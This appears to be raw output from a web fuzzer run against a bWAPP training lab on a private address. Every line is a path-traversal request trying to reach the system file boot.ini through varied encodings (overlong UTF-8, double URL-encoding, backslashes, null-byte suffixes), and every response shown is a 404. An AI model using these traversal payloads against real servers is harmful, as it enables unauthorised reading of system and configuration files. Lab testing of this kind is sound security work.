147,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini
149,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini
150,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini
151,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini
152,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25afboot.ini
153,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
155,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
156,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
154,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
157,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
159,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
158,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
160,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9cboot.ini
162,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9cboot.ini
164,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini
161,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9cboot.ini
163,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini
165,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini
167,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini
166,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini
168,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\boot.ini
169,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
171,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
170,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
172,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
175,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
173,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
174,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
176,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9cboot.ini
177,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
178,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
179,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
183,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
181,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
182,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
180,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
184,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259cboot.ini
185,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259cboot.ini
186,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259cboot.ini
188,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini
187,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini
189,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini
190,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini
191,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini
192,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\boot.ini
193,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
195,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
194,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
196,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
203,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
202,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
197,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
206,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
201,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
200,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259cboot.ini
198,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
199,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
207,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
205,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
204,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
257,404,9L,39W,http://192.168.1.86/bWAPP/../../boot.ini%00index.html
258,404,9L,39W,http://192.168.1.86/bWAPP/../../../boot.ini%00index.html
256,404,9L,39W,http://192.168.1.86/bWAPP/../boot.ini%00index.html
259,404,9L,39W,http://192.168.1.86/bWAPP/../../../../boot.ini%00index.html
263,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../boot.ini%00index.html
262,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../boot.ini%00index.html
268,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2fboot.ini%00index.html
266,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2fboot.ini%00index.html
267,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2fboot.ini%00index.html
270,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00index.html
265,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2fboot.ini%00index.html
271,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00index.html
279,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
275,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
264,404,9L,39W,http://192.168.1.86/bWAPP/..%2fboot.ini%00index.html
278,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
283,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
276,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
282,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
280,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2fboot.ini%00index.html
273,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/boot.ini%00index.html
284,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
274,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
281,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2fboot.ini%00index.html
285,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
272,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/boot.ini%00index.html
286,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
291,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252fboot.ini%00index.html
289,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252fboot.ini%00index.html
288,404,9L,39W,http://192.168.1.86/bWAPP/..%252fboot.ini%00index.html
294,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini%00index.html
296,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/boot.ini%00index.html
298,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
297,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/boot.ini%00index.html
295,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini%00index.html
293,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252fboot.ini%00index.html
300,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
299,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
303,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
292,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252fboot.ini%00index.html
304,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252fboot.ini%00index.html
308,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
305,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252fboot.ini%00index.html
302,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
306,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
307,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
312,404,9L,39W,http://192.168.1.86/bWAPP/..\boot.ini%00index.html
309,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
311,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
315,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\boot.ini%00index.html
314,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\boot.ini%00index.html
313,404,9L,39W,http://192.168.1.86/bWAPP/..\..\boot.ini%00index.html
260,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../boot.ini%00index.html
317,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\boot.ini%00index.html
316,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\boot.ini%00index.html
318,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\boot.ini%00index.html
320,404,9L,39W,http://192.168.1.86/bWAPP/..%5cboot.ini%00index.html
321,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5cboot.ini%00index.html
319,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\..\boot.ini%00index.html
356,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
327,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00index.html
355,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
326,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00index.html
359,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
337,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5cboot.ini%00index.html
336,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5cboot.ini%00index.html
338,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00index.html
332,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini%00index.html
335,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini%00index.html
322,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5cboot.ini%00index.html
324,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5cboot.ini%00index.html
290,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252fboot.ini%00index.html
358,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
377,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2fboot.ini;index.html
368,404,9L,39W,http://192.168.1.86/bWAPP/../boot.ini;index.html
367,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini%00index.html
378,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2fboot.ini;index.html
383,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini;index.html
384,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/boot.ini;index.html
382,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini;index.html
350,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html
348,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html
349,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html
393,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2fboot.ini;index.html
392,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2fboot.ini;index.html
352,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\boot.ini%00index.html
343,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00index.html
396,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
357,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
395,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
401,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252fboot.ini;index.html
402,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252fboot.ini;index.html
403,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252fboot.ini;index.html
334,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini%00index.html
333,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini%00index.html
405,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252fboot.ini;index.html
407,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini;index.html
408,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/boot.ini;index.html
410,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
411,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
342,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00index.html
330,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\boot.ini%00index.html
380,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2fboot.ini;index.html
363,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini%00index.html
379,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2fboot.ini;index.html
381,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2fboot.ini;index.html
406,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini;index.html
362,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini%00index.html
361,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255cboot.ini%00index.html
346,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255cboot.ini%00index.html
413,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
360,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255cboot.ini%00index.html
426,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\boot.ini;index.html
416,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252fboot.ini;index.html
414,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
421,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
429,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\boot.ini;index.html
422,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
433,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5cboot.ini;index.html
432,404,9L,39W,http://192.168.1.86/bWAPP/..%5cboot.ini;index.html
438,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
420,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
427,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\boot.ini;index.html
428,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\boot.ini;index.html
439,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
430,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\boot.ini;index.html
